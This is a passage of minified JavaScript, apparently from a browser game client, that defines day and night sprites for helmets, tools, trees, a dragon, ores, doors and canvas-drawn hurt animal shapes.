                    sprite[ze.CROWN_BLUE][ze.DAY] = c(W0(.2, !0, ["#0d1b1c", "#A5A244", "#D8DC74", "#C0BF55", "#2792C1", "#196599", "#59C0D8"])),
                    sprite[ze.CROWN_BLUE][ze.NIGHT] = c(W0(.2, !0, ["#2b7c57", "#114933", "#1b6656", "#1a7961", "#19899e", "#16688b", "#4ea3c7"])),
                    sprite[ze.CROWN_CRAB] = [],
                    sprite[ze.CROWN_CRAB][ze.DAY] = c(Vt(.24, !0, ["#000000", "#b03431", "#94312d", "#bd3c33", "#e45936"])),
                    sprite[ze.CROWN_CRAB][ze.NIGHT] = c(Vt(.24, !0, ["#000000", "#1b103e", "#190f3b", "#261a4e", "#34255d"])),
                    sprite[ze.DRAGON_HELMET] = [],
                    sprite[ze.DRAGON_HELMET][ze.DAY] = c(di(.32, 0, ["#0d1b1c", "#cae9eb", "#75bcae", "#ffffff", "#51736d", "#2b4d48", "#1b3a3a", "#80ccca", "#59ada7"])),
                    sprite[ze.DRAGON_HELMET][ze.NIGHT] = c(di(.32, 0, ["#0d1b1c", "#70c1d6", "#49b2cf", "#87cad9", "#367c93", "#113743", "#0c2c36", "#51a2b8", "#3a8ea4"])),
                    sprite[ze.DRAGON_SWORD] = [],
                    sprite[ze.DRAGON_SWORD][ze.DAY] = c(I(3, Zi(.9, !0, ["#0d1b1c", "#284c4a", "#193533", "#c8efef", "#7eccbb"]))),
                    sprite[ze.DRAGON_SWORD][ze.NIGHT] = c(I(3, Zi(.9, !0, ["#0d1b1c", "#18332e", "#112320", "#87d2e6", "#49b2cf"]))),
                    sprite[ze.DRAGON_SWORD_HALO] = [],
                    sprite[ze.DRAGON_SWORD_HALO][ze.DAY] = c(I(3, Zi(1, !0, [void 0, void 0, void 0, "#c8efef", "#c8efef"]))),
                    sprite[ze.DRAGON_SWORD_HALO][ze.NIGHT] = c(I(3, Zi(1, !0, [void 0, void 0, void 0, "#87d2e6", "#87d2e6"]))),
                    sprite[ze.QUEST_BUTTON] = [],
                    sprite[ze.QUEST_BUTTON].push(c(P0(.3, 0, ["#0d1b1c", "#392C16", "#5E3E1A", "#704821", "#654320", "#eda80d"], 0))),
                    sprite[ze.QUEST_BUTTON].push(c(P0(.3, 0, ["#0d1b1c", "#392C16", "#5E3E1A", "#704821", "#654320", "#eda80d"], 1))),
                    sprite[ze.QUEST_BUTTON].push(c(P0(.3, 0, ["#0d1b1c", "#392C16", "#5E3E1A", "#704821", "#654320", "#d7990c"], 1))),
                    sprite[ze.MARKET_BUTTON] = [],
                    sprite[ze.MARKET_BUTTON].push(c(z0(.7, ["#392C16", "#5E3E1A", "#85592c", "#eda80d"], 0))),
                    sprite[ze.MARKET_BUTTON].push(c(z0(.7, ["#392C16", "#5E3E1A", "#85592c", "#eda80d"], 1))),
                    sprite[ze.MARKET_BUTTON].push(c(z0(.7, ["#392C16", "#5E3E1A", "#85592c", "#eda80d"], 1))),
                    sprite[ze.SOUND_BUTTON_ON] = [],
                    sprite[ze.SOUND_BUTTON_ON].push(c(Y1(.4, ["#0d1b1c", "#392C16", "#5E3E1A", "#eda80d"], 0, 1))),
                    sprite[ze.SOUND_BUTTON_ON].push(c(Y1(.4, ["#0d1b1c", "#392C16", "#5E3E1A", "#eda80d"], 1, 1))),
                    sprite[ze.SOUND_BUTTON_ON].push(c(Y1(.4, ["#0d1b1c", "#392C16", "#5E3E1A", "#d7990c"], 1, 1))),
                    sprite[ze.SOUND_BUTTON_OFF] = [],
                    sprite[ze.SOUND_BUTTON_OFF].push(c(Y1(.4, ["#0d1b1c", "#392C16", "#5E3E1A", "#eda80d"], 0, 0))),
                    sprite[ze.SOUND_BUTTON_OFF].push(c(Y1(.4, ["#0d1b1c", "#392C16", "#5E3E1A", "#eda80d"], 1, 0))),
                    sprite[ze.SOUND_BUTTON_OFF].push(c(Y1(.4, ["#0d1b1c", "#392C16", "#5E3E1A", "#d7990c"], 1, 0))),
                    sprite[ze.SHOVEL] = [],
                    sprite[ze.SHOVEL][ze.DAY] = c(I(3, G0(.7, !0, ["#0d1b1c", "#6d5041", "#4f3d35", "#939393", "#5f6061", "#757575"]))),
                    sprite[ze.SHOVEL][ze.NIGHT] = c(I(3, G0(.7, !0, ["#0d1b1c", "#0d2e33", "#0b2326", "#485e66", "#1f343f", "#274352"]))),
                    sprite[ze.SHOVEL_GOLD] = [],
                    sprite[ze.SHOVEL_GOLD][ze.DAY] = c(I(3, G0(.7, !0, ["#0d1b1c", "#493e26", "#382e19", "#c4bc51", "#b29c32", "#ada437"]))),
                    sprite[ze.SHOVEL_GOLD][ze.NIGHT] = c(I(3, G0(.7, !0, ["#0d1b1c", "#263947", "#182935", "#43aa82", "#29997c", "#32916c"]))),
                    sprite[ze.SHOVEL_DIAMOND] = [],
                    sprite[ze.SHOVEL_DIAMOND][ze.DAY] = c(I(3, G0(.7, !0, ["#0d1b1c", "#262114", "#211108", "#63c9d6", "#29aaa1", "#42aab8"]))),
                    sprite[ze.SHOVEL_DIAMOND][ze.NIGHT] = c(I(3, G0(.7, !0, ["#0d1b1c", "#111316", "#0a0b0c", "#73dde5", "#3dc4c0", "#49bdc6"]))),
                    sprite[ze.SHOVEL_AMETHYST] = [],
                    sprite[ze.SHOVEL_AMETHYST][ze.DAY] = c(I(3, G0(.7, !0, ["#0d1b1c", "#262114", "#211108", "#b864d6", "#8c29aa", "#9641b5"]))),
                    sprite[ze.SHOVEL_AMETHYST][ze.NIGHT] = c(I(3, G0(.7, !0, ["#0d1b1c", "#111316", "#0a0b0c", "#8359d3", "#764eb5", "#6f45c2"]))),
                    sprite[ze.SHOP] = [],
                    sprite[ze.SHOP].push(c(Qi(.7, ["#3b330d", "#b5a118", "#c8ac16"]))),
                    sprite[ze.SHOP].push(c(Qi(.7, ["#524712", "#c7b11c", "#d9ba18"]))),
                    sprite[ze.SHOP].push(c(Qi(.7, ["#2a2409", "#9f8e14", "#ad9511"]))),
                    sprite[ze.HURT_WOLF] = c((E = 1.1,
                        T = ["#BB0000"],
                        r = document.createElement("canvas"),
                        s = r.getContext("2d"),
                        r.width = 188 * E,
                        r.height = 190 * E,
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(33.00567626953125 * E, 95.44320678710938 * E),
                        s.bezierCurveTo(42.00567626953125 * E, 87.44320678710938 * E, 48.00567626953125 * E, 51.443206787109375 * E, 74.00567626953125 * E, 47.443206787109375 * E),
                        s.bezierCurveTo(100.00567626953125 * E, 42.443206787109375 * E, 118.00567626953125 * E, 49.443206787109375 * E, 131.00567626953125 * E, 55.443206787109375 * E),
                        s.bezierCurveTo(140.00567626953125 * E, 70.44320678710938 * E, 145.00567626953125 * E, 87.44320678710938 * E, 152.00567626953125 * E, 94.44320678710938 * E),
                        s.bezierCurveTo(149.00567626953125 * E, 99.44320678710938 * E, 147.00567626953125 * E, 98.44320678710938 * E, 141.00567626953125 * E, 101.44320678710938 * E),
                        s.bezierCurveTo(147.00567626953125 * E, 108.44320678710938 * E, 147.00567626953125 * E, 111.44320678710938 * E, 147.00567626953125 * E, 112.44320678710938 * E),
                        s.bezierCurveTo(143.00567626953125 * E, 112.44320678710938 * E, 141.00567626953125 * E, 112.44320678710938 * E, 137.00567626953125 * E, 111.44320678710938 * E),
                        s.bezierCurveTo(138.00567626953125 * E, 117.44320678710938 * E, 138.00567626953125 * E, 120.44320678710938 * E, 138.00567626953125 * E, 124.44320678710938 * E),
                        s.bezierCurveTo(125.00567626953125 * E, 107.44320678710938 * E, 121.00567626953125 * E, 124.44320678710938 * E, 110.00567626953125 * E, 141.44320678710938 * E),
                        s.bezierCurveTo(102.00567626953125 * E, 158.44320678710938 * E, 89.00567626953125 * E, 158.44320678710938 * E, 80.00567626953125 * E, 144.44320678710938 * E),
                        s.bezierCurveTo(61.00567626953125 * E, 111.44320678710938 * E, 56.00567626953125 * E, 117.44320678710938 * E, 48.00567626953125 * E, 120.44320678710938 * E),
                        s.bezierCurveTo(46.00567626953125 * E, 118.44320678710938 * E, 47.00567626953125 * E, 112.44320678710938 * E, 48.00567626953125 * E, 107.44320678710938 * E),
                        s.bezierCurveTo(43.00567626953125 * E, 111.44320678710938 * E, 40.00567626953125 * E, 111.44320678710938 * E, 37.00567626953125 * E, 110.44320678710938 * E),
                        s.bezierCurveTo(39.50567626953125 * E, 104.94320678710938 * E, 39.50567626953125 * E, 104.94320678710938 * E, 42.00567626953125 * E, 99.44320678710938 * E),
                        s.bezierCurveTo(33.00567626953125 * E, 99.44320678710938 * E, 33.00567626953125 * E, 98.44320678710938 * E, 33.00567626953125 * E, 96.44320678710938 * E),
                        s.closePath(),
                        he(s, T[0], T[0], 4 * E),
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(51.00567626953125 * E, 72.53409576416016 * E),
                        s.bezierCurveTo(48.00567626953125 * E, 56.534095764160156 * E, 48.00567626953125 * E, 49.534095764160156 * E, 54.00567626953125 * E, 35.534095764160156 * E),
                        s.bezierCurveTo(58.00567626953125 * E, 26.534095764160156 * E, 65.00567626953125 * E, 27.534095764160156 * E, 73.00567626953125 * E, 40.534095764160156 * E),
                        s.bezierCurveTo(81.00567626953125 * E, 49.534095764160156 * E, 82.00567626953125 * E, 50.534095764160156 * E, 83.00567626953125 * E, 51.534095764160156 * E),
                        s.bezierCurveTo(77.00567626953125 * E, 71.53409576416016 * E, 64.00567626953125 * E, 75.53409576416016 * E, 51.00567626953125 * E, 72.53409576416016 * E),
                        s.closePath(),
                        he(s, T[0], T[0], 2 * E),
                        s.beginPath(),
                        s.lineCap = "round",
                        s.lineJoin = "round",
                        s.moveTo(105.00567626953125 * E, 50.53410339355469 * E),
                        s.bezierCurveTo(112.00567626953125 * E, 48.53410339355469 * E, 125.00567626953125 * E, 21.534103393554688 * E, 132.00567626953125 * E, 33.53410339355469 * E),
                        s.bezierCurveTo(138.00567626953125 * E, 42.53410339355469 * E, 140.00567626953125 * E, 64.53410339355469 * E, 136.00567626953125 * E, 75.53410339355469 * E),
                        s.closePath(),
                        he(s, T[0], T[0], 2 * E),
                        r)),
                    sprite[ze.HURT_SPIDER] = c(I(Math.PI, (o = .9,
                        a = "#BB0000",
                        n = document.createElement("canvas"),
                        d = n.getContext("2d"),
                        n.width = 238 * o,
                        n.height = 230 * o,
                        d.translate(-93 * o, -110 * o),
                        ke(d, 213.5 * o, 256.75 * o, 75 * o),
                        he(d, a),
                        ke(d, 213.5 * o, 175.75 * o, 25 * o),
                        he(d, a),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(156.5 * o, 137.75 * o),
                        d.bezierCurveTo(170.5 * o, 173.75 * o, 195.5 * o, 177.75 * o, 209.5 * o, 177.75 * o),
                        d.lineWidth = 17 * o,
                        d.strokeStyle = a,
                        d.stroke(),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(217.5 * o, 178.75 * o),
                        d.bezierCurveTo(251.5 * o, 177.75 * o, 263.5 * o, 153.75 * o, 270.5 * o, 140.75 * o),
                        d.lineWidth = 17 * o,
                        d.strokeStyle = a,
                        d.stroke(),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(130.5 * o, 124.75 * o),
                        d.bezierCurveTo(153.5 * o, 185.75 * o, 198.5 * o, 185.75 * o, 213.5 * o, 185.75 * o),
                        d.lineWidth = 17 * o,
                        d.strokeStyle = a,
                        d.stroke(),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(214.5 * o, 183.75 * o),
                        d.bezierCurveTo(265.5 * o, 192.75 * o, 293.5 * o, 141.75 * o, 297.5 * o, 124.75 * o),
                        d.lineWidth = 17 * o,
                        d.strokeStyle = a,
                        d.stroke(),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(107.5 * o, 213.75 * o),
                        d.bezierCurveTo(151.5 * o, 190.75 * o, 198.5 * o, 184.75 * o, 210.5 * o, 184.75 * o),
                        d.lineWidth = 17 * o,
                        d.strokeStyle = a,
                        d.stroke(),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(212.5 * o, 187.75 * o),
                        d.bezierCurveTo(258.5 * o, 182.75 * o, 286.5 * o, 194.75 * o, 314.5 * o, 206.75 * o),
                        d.lineWidth = 17 * o,
                        d.strokeStyle = a,
                        d.stroke(),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(102.5 * o, 258.75 * o),
                        d.bezierCurveTo(142.5 * o, 200.75 * o, 193.5 * o, 194.75 * o, 211.5 * o, 185.75 * o),
                        d.lineWidth = 17 * o,
                        d.strokeStyle = a,
                        d.stroke(),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(214.5 * o, 192.75 * o),
                        d.bezierCurveTo(276.5 * o, 194.75 * o, 306.5 * o, 233.75 * o, 316.5 * o, 246.75 * o),
                        d.lineWidth = 17 * o,
                        d.strokeStyle = a,
                        d.stroke(),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(219.5 * o, 158.75 * o),
                        d.bezierCurveTo(226.5 * o, 159.75 * o, 227.5 * o, 147.75 * o, 219.5 * o, 145.75 * o),
                        d.closePath(),
                        d.lineWidth = 10 * o,
                        d.strokeStyle = a,
                        d.stroke(),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(210.5 * o, 160.75 * o),
                        d.bezierCurveTo(203.5 * o, 159.75 * o, 199.5 * o, 146.75 * o, 210.5 * o, 145.75 * o),
                        d.closePath(),
                        d.lineWidth = 10 * o,
                        d.strokeStyle = a,
                        d.stroke(),
                        n))),
                    sprite[ze.EXPLORER_HAT] = [],
                    sprite[ze.EXPLORER_HAT][ze.DAY] = c(fi(.55, !0, ["#c9a65f", "#ae863f", "#655530", "#4a391c", "#ebdd79", "#4a421c"])),
                    sprite[ze.EXPLORER_HAT][ze.NIGHT] = c(fi(.55, !0, ["#15514f", "#0f3f3d", "#123335", "#0d2d2b", "#2b6664", "#070d16"])),
                    sprite[ze.WOOD_HELMET] = [],
                    sprite[ze.WOOD_HELMET][ze.DAY] = c(Li(.55, !0, ["#252525", "#73583e", "#573f29", "#7d6144"])),
                    sprite[ze.WOOD_HELMET][ze.NIGHT] = c(Li(.55, !0, ["#0d3b39", "#144642", "#0b3230", "#154f4b"])),
                    sprite[ze.STONE_HELMET] = [],
                    sprite[ze.STONE_HELMET][ze.DAY] = c(Gi(.6, !0, ["#252525", "#808080", "#4a4a4a", "#9e9c8b", "#615c53", "#686969", "#8a8776", "#555555", "#747474", "#969696", "#454545"])),
                    sprite[ze.STONE_HELMET][ze.NIGHT] = c(Gi(.6, !0, ["#030d14", "#1c4a4a", "#102d2d", "#255756", "#163d3c", "#194544", "#1f5252", "#184141", "#1c4a4a", "#255756", "#163a3a"])),
                    sprite[ze.GOLD_HELMET] = [],
                    sprite[ze.GOLD_HELMET][ze.DAY] = c(yi(.58, 0, ["#dbce71", "#b29c32", "#c4bc51"])),
                    sprite[ze.GOLD_HELMET][ze.NIGHT] = c(yi(.58, 0, ["#2b7c57", "#15543c", "#1a7961"])),
                    sprite[ze.DIAMOND_HELMET] = [],
                    sprite[ze.DIAMOND_HELMET][ze.DAY] = c(Hi(.69, 0, ["#717171", "#485252", "#555555", "#65c7cd", "#4aadad", "#358d8b", "#c1e6ea", "#a6dce4"])),
                    sprite[ze.DIAMOND_HELMET][ze.NIGHT] = c(Hi(.69, 0, ["#183f3f", "#092121", "#123335", "#2b9390", "#277a74", "#1f665f", "#83ddd4", "#59c9c0"])),
                    sprite[ze.FIR] = [],
                    sprite[ze.FIR][ze.DAY] = [],
                    sprite[ze.FIR][ze.NIGHT] = [],
                    sprite[ze.FIR][ze.DAY].push(c(hi(1.3, ["#0a2d18", "#124c34", "#227248", "#ccedd9", "#2d7a55", "#3c9660", "#afddc1", "#bbefd0", "#0a2d18", "#e4efe8"]))),
                    sprite[ze.FIR][ze.DAY].push(c(Ai(1.5, ["#191919", "#134d35", "#247349", "#afddc1", "#bbefd0", "#e4efe8"]))),
                    sprite[ze.FIR][ze.DAY].push(c(Ti(1.5, ["#191919", "#134d35", "#247349", "#cde7d6", "#122d1c", "#e3eee7"]))),
                    sprite[ze.FIR][ze.NIGHT].push(c(hi(1.3, ["#000000", "#0e3638", "#174a51", "#328587", "#174a51", "#1d5559", "#328587", "#48a8aa", "#0a2728", "#56afac"]))),
                    sprite[ze.FIR][ze.NIGHT].push(c(Ai(1.5, ["#000000", "#0e3638", "#174a51", "#328587", "#48a8aa", "#56afac"]))),
                    sprite[ze.FIR][ze.NIGHT].push(c(Ti(1.5, ["#000000", "#0e3638", "#174a51", "#328587", "#0a2728", "#56afac"]))),
                    sprite[ze.DRAGON] = [],
                    sprite[ze.DRAGON][ze.DAY] = c(Di(1, ["#292b2b", "#57aba6", "#80ccca", "#c42333", "#a4dad9", "#3e8294", "#ffffff", "#57aba6", "#ffffff"])),
                    sprite[ze.DRAGON][ze.NIGHT] = c(Di(1, ["#050505", "#1d3a38", "#0b514a", "#200333", "#327570", "#1d3a38", "#ffffff", "#0b514a", "#63afa9"])),
                    sprite[ze.WING_LEFT] = [],
                    sprite[ze.WING_LEFT][ze.DAY] = c(vi(1, ["#292b2b", "#a4dad9", "#1f3f3f", "#c1233b"])),
                    sprite[ze.WING_LEFT][ze.NIGHT] = c(vi(1, ["#050505", "#327570", "#021724", "#200333"])),
                    sprite[ze.WING_RIGHT] = [],
                    sprite[ze.WING_RIGHT][ze.DAY] = c(Mi(1, ["#292b2b", "#a4dad9", "#1f3f3f", "#c1233b"])),
                    sprite[ze.WING_RIGHT][ze.NIGHT] = c(Mi(1, ["#050505", "#327570", "#021724", "#200333"])),
                    sprite[ze.DECORATION] = [],
                    sprite[ze.DECORATION][ze.DAY] = [],
                    sprite[ze.DECORATION][ze.NIGHT] = [],
                    sprite[ze.DECORATION][ze.DAY] = [IMAGES.DECORATION_0D, IMAGES.DECORATION_1D, IMAGES.DECORATION_2D, IMAGES.DECORATION_3D, IMAGES.DECORATION_4D, IMAGES.DECORATION_5D, IMAGES.DECORATION_6D, IMAGES.DECORATION_7D, IMAGES.DECORATION_8D, IMAGES.DECORATION_9D, IMAGES.DECORATION_10D, IMAGES.DECORATION_11D, IMAGES.DECORATION_12D, IMAGES.DECORATION_13D, IMAGES.DECORATION_14D, IMAGES.DECORATION_15D, IMAGES.DECORATION_16D, IMAGES.DECORATION_17D, IMAGES.DECORATION_18D, IMAGES.DECORATION_19D, IMAGES.DECORATION_20D, IMAGES.DECORATION_21D, IMAGES.DECORATION_22D, IMAGES.DECORATION_23D, IMAGES.DECORATION_24D, IMAGES.DECORATION_25D, IMAGES.DECORATION_26D, IMAGES.DECORATION_27D, IMAGES.DECORATION_28D, IMAGES.DECORATION_29D, IMAGES.DECORATION_30D, IMAGES.DECORATION_31D, IMAGES.DECORATION_32D, IMAGES.DECORATION_33D, IMAGES.DECORATION_34D, IMAGES.DECORATION_35D, IMAGES.DECORATION_36D, IMAGES.DECORATION_37D, IMAGES.DECORATION_38D, IMAGES.DECORATION_39D, IMAGES.DECORATION_40D, IMAGES.DECORATION_41D, IMAGES.DECORATION_42D, IMAGES.DECORATION_43D, IMAGES.DECORATION_44D, IMAGES.DECORATION_45D, IMAGES.DECORATION_46D, IMAGES.DECORATION_47D, IMAGES.DECORATION_48D, IMAGES.DECORATION_49D, IMAGES.DECORATION_50D, IMAGES.DECORATION_51D, IMAGES.DECORATION_52D, IMAGES.DECORATION_53D, IMAGES.DECORATION_54D, IMAGES.DECORATION_55D],
                    sprite[ze.DECORATION][ze.NIGHT] = [IMAGES.DECORATION_0N, IMAGES.DECORATION_1N, IMAGES.DECORATION_2N, IMAGES.DECORATION_3N, IMAGES.DECORATION_4N, IMAGES.DECORATION_5N, IMAGES.DECORATION_6N, IMAGES.DECORATION_7N, IMAGES.DECORATION_8N, IMAGES.DECORATION_9N, IMAGES.DECORATION_10N, IMAGES.DECORATION_11N, IMAGES.DECORATION_12N, IMAGES.DECORATION_13N, IMAGES.DECORATION_14N, IMAGES.DECORATION_15N, IMAGES.DECORATION_16N, IMAGES.DECORATION_17N, IMAGES.DECORATION_18N, IMAGES.DECORATION_19N, IMAGES.DECORATION_20N, IMAGES.DECORATION_21N, IMAGES.DECORATION_22N, IMAGES.DECORATION_23N, IMAGES.DECORATION_24N, IMAGES.DECORATION_25N, IMAGES.DECORATION_26N, IMAGES.DECORATION_27N, IMAGES.DECORATION_28N, IMAGES.DECORATION_29N, IMAGES.DECORATION_30N, IMAGES.DECORATION_31N, IMAGES.DECORATION_32N, IMAGES.DECORATION_33N, IMAGES.DECORATION_34N, IMAGES.DECORATION_35N, IMAGES.DECORATION_36N, IMAGES.DECORATION_37N, IMAGES.DECORATION_38N, IMAGES.DECORATION_39N, IMAGES.DECORATION_40N, IMAGES.DECORATION_41N, IMAGES.DECORATION_42N, IMAGES.DECORATION_43N, IMAGES.DECORATION_44N, IMAGES.DECORATION_45N, IMAGES.DECORATION_46N, IMAGES.DECORATION_47N, IMAGES.DECORATION_48N, IMAGES.DECORATION_49N, IMAGES.DECORATION_50N, IMAGES.DECORATION_51N, IMAGES.DECORATION_52N, IMAGES.DECORATION_53N, IMAGES.DECORATION_54N, IMAGES.DECORATION_55N],
                    sprite[ze.CAVE_STONES] = [],
                    sprite[ze.CAVE_STONES][ze.DAY] = [],
                    sprite[ze.CAVE_STONES][ze.NIGHT] = [],
                    sprite[ze.CAVE_STONES][ze.DAY].push(c(ht(1.1, !1, ["#252B28", "#747471", "#83827e"], 0))),
                    sprite[ze.CAVE_STONES][ze.DAY].push(c(ht(.9, !1, ["#252B28", "#747471", "#83827e"], 1))),
                    sprite[ze.CAVE_STONES][ze.DAY].push(c(ht(1, !1, ["#252B28", "#747471", "#83827e"], 2))),
                    sprite[ze.CAVE_STONES][ze.DAY].push(c(ht(.9, !1, ["#252B28", "#747471", "#83827e"], 2))),
                    sprite[ze.CAVE_STONES][ze.NIGHT].push(c(ht(1.1, !1, ["#030d14", "#123335", "#183f3f"], 0))),
                    sprite[ze.CAVE_STONES][ze.NIGHT].push(c(ht(.9, !1, ["#030d14", "#123335", "#183f3f"], 1))),
                    sprite[ze.CAVE_STONES][ze.NIGHT].push(c(ht(1, !1, ["#030d14", "#123335", "#183f3f"], 2))),
                    sprite[ze.CAVE_STONES][ze.NIGHT].push(c(ht(.9, !1, ["#030d14", "#123335", "#183f3f"], 2))),
                    sprite[ze.SHADOW_CAVE_STONES] = [],
                    sprite[ze.SHADOW_CAVE_STONES][ze.DAY] = [],
                    sprite[ze.SHADOW_CAVE_STONES][ze.NIGHT] = [],
                    sprite[ze.SHADOW_CAVE_STONES][ze.DAY].push(c(ht(1.1, !0, ["#252B28", "#58645F", "#75827D"], 2))),
                    sprite[ze.SHADOW_CAVE_STONES][ze.DAY].push(c(ht(.9, !0, ["#252B28", "#58645F", "#75827D"], 2))),
                    sprite[ze.SHADOW_CAVE_STONES][ze.DAY].push(c(ht(1, !0, ["#252B28", "#58645F", "#75827D"], 2))),
                    sprite[ze.SHADOW_CAVE_STONES][ze.DAY].push(c(ht(.9, !0, ["#252B28", "#58645F", "#75827D"], 2))),
                    sprite[ze.SHADOW_CAVE_STONES][ze.NIGHT].push(c(ht(1.1, !0, ["#030d14", "#123335", "#183f3f"], 2))),
                    sprite[ze.SHADOW_CAVE_STONES][ze.NIGHT].push(c(ht(.9, !0, ["#030d14", "#123335", "#183f3f"], 2))),
                    sprite[ze.SHADOW_CAVE_STONES][ze.NIGHT].push(c(ht(1, !0, ["#030d14", "#123335", "#183f3f"], 2))),
                    sprite[ze.SHADOW_CAVE_STONES][ze.NIGHT].push(c(ht(.9, !0, ["#030d14", "#123335", "#183f3f"], 2))),
                    sprite[ze.GOLD_WINTER] = [],
                    sprite[ze.GOLD_WINTER][ze.DAY] = [],
                    sprite[ze.GOLD_WINTER][ze.NIGHT] = [],
                    sprite[ze.GOLD_WINTER][ze.DAY].push(c(lt(1.5, 0, ["#2b280a", "#ddcf8a", "#f4efc6"]))),
                    sprite[ze.GOLD_WINTER][ze.DAY].push(c(lt(1.3, 0, ["#2b280a", "#ddcf8a", "#f4efc6"]))),
                    sprite[ze.GOLD_WINTER][ze.DAY].push(c(lt(1.1, 0, ["#2b280a", "#ddcf8a", "#f4efc6"]))),
                    sprite[ze.GOLD_WINTER][ze.NIGHT].push(c(lt(1.5, 0, ["#0a2728", "#3e8989", "#50a09c"]))),
                    sprite[ze.GOLD_WINTER][ze.NIGHT].push(c(lt(1.3, 0, ["#0a2728", "#3e8989", "#50a09c"]))),
                    sprite[ze.GOLD_WINTER][ze.NIGHT].push(c(lt(1.1, 0, ["#0a2728", "#3e8989", "#50a09c"]))),
                    sprite[ze.DIAMOND_WINTER] = [],
                    sprite[ze.DIAMOND_WINTER][ze.DAY] = [],
                    sprite[ze.DIAMOND_WINTER][ze.NIGHT] = [],
                    sprite[ze.DIAMOND_WINTER][ze.DAY].push(c(It(1.1, 0, ["#123d38", "#70e0dd", "#95efea"]))),
                    sprite[ze.DIAMOND_WINTER][ze.DAY].push(c(It(.9, 0, ["#123d38", "#70e0dd", "#95efea"]))),
                    sprite[ze.DIAMOND_WINTER][ze.DAY].push(c(It(.7, 0, ["#123d38", "#70e0dd", "#95efea"]))),
                    sprite[ze.DIAMOND_WINTER][ze.NIGHT].push(c(It(1.1, 0, ["#123d38", "#47b2ac", "#5cccc4"]))),
                    sprite[ze.DIAMOND_WINTER][ze.NIGHT].push(c(It(.9, 0, ["#123d38", "#47b2ac", "#5cccc4"]))),
                    sprite[ze.DIAMOND_WINTER][ze.NIGHT].push(c(It(.7, 0, ["#123d38", "#47b2ac", "#5cccc4"]))),
                    sprite[ze.AMETHYST] = [],
                    sprite[ze.AMETHYST][ze.DAY] = [],
                    sprite[ze.AMETHYST][ze.NIGHT] = [],
                    sprite[ze.AMETHYST][ze.DAY].push(c(li(1.7, !0, ["#1d051e", "#c27add", "#cd98e5"]))),
                    sprite[ze.AMETHYST][ze.DAY].push(c(li(1.5, !0, ["#1d051e", "#c27add", "#cd98e5"]))),
                    sprite[ze.AMETHYST][ze.DAY].push(c(li(1.3, !0, ["#1d051e", "#c27add", "#cd98e5"]))),
                    sprite[ze.AMETHYST][ze.NIGHT].push(c(li(1.7, !0, ["#1d051e", "#41aaa0", "#5cccc4"]))),
                    sprite[ze.AMETHYST][ze.NIGHT].push(c(li(1.5, !0, ["#1d051e", "#41aaa0", "#5cccc4"]))),
                    sprite[ze.AMETHYST][ze.NIGHT].push(c(li(1.3, !0, ["#1d051e", "#41aaa0", "#5cccc4"]))),
                    sprite[ze.WATERBLOCK] = [],
                    sprite[ze.WATERBLOCK][ze.DAY] = [],
                    sprite[ze.WATERBLOCK][ze.NIGHT] = [],
                    sprite[ze.WATERBLOCK][ze.DAY].push(c(Ii(1, ["#2d53c4"]))),
                    sprite[ze.WATERBLOCK][ze.NIGHT].push(c(Ii(1, ["#2d53c4"]))),
                    sprite[ze.ISLAND_BLOCK] = [],
                    sprite[ze.ISLAND_BLOCK][ze.DAY] = [],
                    sprite[ze.ISLAND_BLOCK][ze.NIGHT] = [],
                    sprite[ze.ISLAND_BLOCK][ze.DAY].push(c(Ii(1, ["#c4912d"]))),
                    sprite[ze.ISLAND_BLOCK][ze.NIGHT].push(c(Ii(1, ["#c4912d"]))),
                    sprite[ze.CAVE_STEP] = [],
                    sprite[ze.CAVE_STEP][ze.DAY] = c(Ni(1, ["#414040"])),
                    sprite[ze.CAVE_STEP][ze.NIGHT] = c(Ni(1, ["#153635"])),
                    sprite[ze.DOOR_WOOD_OPEN_WINTER] = [],
                    sprite[ze.DOOR_WOOD_OPEN_WINTER][ze.DAY] = c(yt(1, !1, ["#EBF2F0", "#EBF2F0", "#b2d4d1", "#b2d4d1", "#EBF2F0", "#b2d4d1"])),
                    sprite[ze.DOOR_WOOD_OPEN_WINTER][ze.NIGHT] = c(yt(1, !1, ["#136167", "#136167", "#24878f", "#24878f", "#136167", "#24878f"])),
                    sprite[ze.DOOR_STONE_OPEN_WINTER] = [],
                    sprite[ze.DOOR_STONE_OPEN_WINTER][ze.DAY] = c(Ht(1, !1, ["#EBF2F0", "#EBF2F0", "#b2d4d1", "#b2d4d1", "#EBF2F0", "#b2d4d1"])),
                    sprite[ze.DOOR_STONE_OPEN_WINTER][ze.NIGHT] = c(Ht(1, !1, ["#136167", "#136167", "#24878f", "#24878f", "#136167", "#24878f"])),
                    sprite[ze.DOOR_AMETHYST_OPEN_WINTER] = [],
                    sprite[ze.DOOR_AMETHYST_OPEN_WINTER][ze.DAY] = c(Ht(1, !1, ["#EBF2F0", "#EBF2F0", "#b2d4d1", "#b2d4d1", "#EBF2F0", "#b2d4d1"])),
                    sprite[ze.DOOR_AMETHYST_OPEN_WINTER][ze.NIGHT] = c(Ht(1, !1, ["#136167", "#136167", "#24878f", "#24878f", "#136167", "#24878f"])),
                    sprite[ze.DOOR_DIAMOND_OPEN_WINTER] = [],
                    sprite[ze.DOOR_DIAMOND_OPEN_WINTER][ze.DAY] = c(wt(1, !1, ["#EBF2F0", "#EBF2F0", "#b2d4d1", "#b2d4d1", "#EBF2F0", "#b2d4d1"])),
                    sprite[ze.DOOR_DIAMOND_OPEN_WINTER][ze.NIGHT] = c(wt(1, !1, ["#136167", "#136167", "#24878f", "#24878f", "#136167", "#24878f"])),
                    sprite[ze.DOOR_GOLD_OPEN_WINTER] = [],
